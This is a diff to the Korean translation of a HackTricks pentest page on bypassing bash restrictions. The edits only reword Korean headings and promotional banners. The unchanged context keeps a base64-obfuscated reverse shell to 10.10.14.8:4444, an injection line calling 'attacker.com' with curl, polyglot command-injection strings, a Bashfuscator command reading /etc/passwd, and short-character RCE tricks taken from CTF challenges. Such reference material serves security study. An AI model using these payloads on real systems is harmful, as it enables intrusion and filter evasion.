@@ -6,23 +6,23 @@
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
-* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
+* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)**에 가입하거나 [텔레그램 그룹](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
+* **해킹 트릭을 공유하고 싶다면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 **세계에서 가장 고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 **가장 고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축하고 자동화**하세요.\
 오늘 바로 액세스하세요:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## 일반적인 제한 우회
+## 공통 제한 우회
 
 ### 리버스 쉘
 ```bash
@@ -38,7 +38,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### 우회 경로 및 금지된 단어
+### 경로 및 금지된 단어 우회
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -93,7 +93,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### 금지된 공백 우회하기
+### 금지된 공백 우회
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -165,8 +165,8 @@ echo ${PATH:0:1} #/
 
 ### 내장 함수
 
-외부 함수를 실행할 수 없고 **제한된 내장 함수만 사용하여 RCE를 얻을 수 있는 경우**, 이를 우회하기 위한 유용한 트릭이 있습니다. 일반적으로 **모든** **내장 함수를 사용할 수 없을 것**이므로, **모든 옵션을 알고** 감옥을 우회하려고 시도해야 합니다. [**devploit**](https://twitter.com/devploit)의 아이디어에서 나온 것입니다.\
-먼저 모든 [**쉘 내장 함수**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**를 확인**하십시오. 그런 다음 여기에 몇 가지 **권장 사항**이 있습니다:
+외부 함수를 실행할 수 없고 **제한된 내장 함수만 사용하여 RCE를 얻을 수 있는 경우**, 이를 우회하기 위한 유용한 트릭이 있습니다. 일반적으로 **모든** **내장 함수를 사용할 수 없을 것**이므로, **모든 옵션을 알고 있어야** 감옥을 우회하려고 시도해야 합니다. [**devploit**](https://twitter.com/devploit)의 아이디어에서 나온 것입니다.\
+먼저 모든 [**쉘 내장 함수**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**를 확인**하십시오. 그런 다음 여기 몇 가지 **권장 사항**이 있습니다:
 ```bash
 # Get list of builtins
 declare builtins
@@ -218,12 +218,12 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### 다중언어 명령 삽입
+### 다중 언어 명령 삽입
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### 잠재적인 정규 표현식 우회
+### 정규 표현식 우회
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -233,7 +233,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### 5글자로 RCE 우회
+### 5 글자로 RCE 실행
 ```bash
 # From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Oragnge Tsai solution
@@ -280,7 +280,7 @@ ln /f*
 ## If there is a file /flag.txt that will create a hard link
 ## to it in the current folder
 ```
-### 4글자로 RCE 실행하기
+### 4글자로 RCE 실행
 ```bash
 # In a similar fashion to the previous bypass this one just need 4 chars to execute commands
 # it will follow the same principle of creating the command `ls -t>g` in a file
@@ -317,10 +317,10 @@ ln /f*
 ```
 ## 읽기 전용/Noexec/Distroless 우회
 
-만약 **읽기 전용 및 noexec 보호** 또는 distroless 컨테이너 내부에 있다면, 여전히 **임의의 이진 파일을 실행하는 방법이 있습니다. 심지어 셸을 실행할 수도 있습니다!:**
+만약 **읽기 전용 및 noexec 보호** 또는 distroless 컨테이너 내부에 있다면, 여전히 **임의의 이진 파일을 실행하는 방법이 있습니다. 심지어 셸을 실행할 수 있습니다!:**
 
-{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
-[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
+{% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
+[bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
 ## Chroot 및 다른 감옥 우회
@@ -336,10 +336,10 @@ ln /f*
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 **가장 고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)를 사용하여 세계에서 가장 **고급 커뮤니티 도구**를 활용한 **워크플로우를 쉽게 구축하고 자동화**하세요.\
 오늘 바로 액세스하세요:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
